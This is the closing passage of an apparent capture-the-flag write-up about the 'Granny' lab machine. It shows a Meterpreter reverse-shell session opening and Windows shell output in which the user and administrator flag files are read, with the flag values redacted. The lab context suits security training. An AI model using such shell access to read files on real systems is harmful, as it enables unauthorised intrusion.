+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.16.12:4444 -&gt; 10.10.10.15:1042<span class="o">)</span> at 2025-01-30 02:14:08 +1100
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ocuments and Settings<span class="se">\L</span>akis<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type </span>user.txt
+&lt;redacted&gt;
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\L</span>akis<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IP Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.15
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.2
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+&lt;redacted&gt;
+C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IP Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.15
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.2
+</code></pre></div></div> <p><br> And with that, wrapped up Granny. See you in the next one.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
